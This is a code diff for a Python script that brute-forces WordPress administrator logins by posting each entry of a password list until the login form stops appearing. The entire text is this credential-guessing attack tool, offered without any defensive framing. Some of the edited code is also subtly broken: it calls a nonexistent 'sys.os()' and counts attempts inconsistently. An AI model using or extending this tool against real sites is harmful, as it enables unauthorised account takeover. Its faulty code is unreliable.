@@ -30,16 +30,20 @@ print("URL: " + url)
 print("login: " + log)
 dns = (url.split("/"))[2]
 protocol = url.split("/")[0]
-wp_admin_url =  protocol + "//" +  dns + "/wp-admin/"
+wp_admin_url =  protocol + "//" +  dns + "/wp-login/"
+tries = 1
+
+print(f"login page: {wp_admin_url}")
 
 with open("passwords.lst", 'r') as f:
     passwords = f.read().rsplit('\n')
 
 for password in passwords:
+    
     data = {'log':log,
-            'pwd': password
-            }
-    print("[+]Trying " + log + ":" + password)
+            'pwd': password}
+
+    print(f"[{tries}] " + log + ":" + password)
      
     with  requests.Session() as s:
         s.post(url, data=data)
@@ -48,9 +52,10 @@ for password in passwords:
     if response is not None:
         if str(response) != "<Response [200]>":
             print(response)
+            tries = tries + 1
+            
+        elif not 'loginform' in response.text:
+            print("Password found!!!---> " + log + ":" +  password )
+            sys.os()
             break
-        else:
-            if not 'loginform' in response.text:
-                print("Password found!!!---> " + log + ":" +  password )
-                break
         
